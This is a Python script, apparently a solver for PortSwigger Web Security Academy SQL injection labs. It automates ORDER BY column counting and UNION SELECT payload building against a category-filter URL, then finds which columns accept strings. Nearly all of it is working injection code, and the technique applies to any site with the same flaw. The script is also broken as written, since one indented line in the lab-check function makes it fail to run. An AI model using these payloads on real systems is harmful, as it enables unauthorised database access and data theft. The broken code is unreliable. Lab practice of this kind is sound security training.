#created to be used with Portswigger WebSec Academy
#replace url with lab url similar to one seen below
import requests
#url = 'https://ac101f911ebb51778049188000010041.web-security-academy.net/filter?category=Accessories'
url = 'https://acf91f5e1e4ce1c080272a03007f00ed.web-security-academy.net/filter?category=Accessories'
sqli_row = ["'+ORDER+BY+",
            "'+UNION+SELECT+"]
used_attack_r = []
lab = 2 # enter the lab numner to perform the correct lab check
nulls = ""
valid_rows = 0
final_attack = ""
compatible_col = []
session = requests.Session()

try:
    r = session.get(url=url)
    print(r)
except Exception as e:
    print(e)
    exit()

def find_rows():
    global nulls,valid_rows,r, final_attack
    if r.status_code == 200:
        for x in range(1,100):
            attack_url = url[:url.rfind("=")+1]+sqli_row[0]+str(x)+"--"
            used_attack_r.append(attack_url)
            r = session.get(url=attack_url)
            if r.status_code == 500:
                valid_rows = x-1
                print("Valid number of rows is:",x-1)
                print(used_attack_r[x-2])
                for y in range(x-1):
                    nulls += "NULL,"
                final_attack = url[:url.rfind("=")+1]+sqli_row[1]+nulls[:len(nulls)-1]+"--"
                print(final_attack)
                break

def check_columns():
    global r, final_attack, compatible_col
    for x in range(valid_rows):
        s = final_attack.split(',')
        s[x] = s[x].replace('NULL', "'a'")
        r = session.get(url=(',').join(s))
        if r.status_code == 200:
            compatible_col.append(x+1)
            print("Column %s is comaptible" % str(x+1))


def pass_lab_check():
    if lab == 1:
        print(final_attack)
        r = session.get(url=final_attack)
    elif lab == 2:
        print(final_attack.replace("'a'","'SLrvzD'")) #replace with required string from lab2
        r = session.get(url=final_attack.replace("'a'","'SLrvzD'"))#replace with required string from lab2
            if "Congratulations, you solved the lab!" in r.text:
        print("lab passed")

def main():
    find_rows()
    if lab != 1:
        check_columns()
    pass_lab_check()

if __name__ == '__main__':
    main()
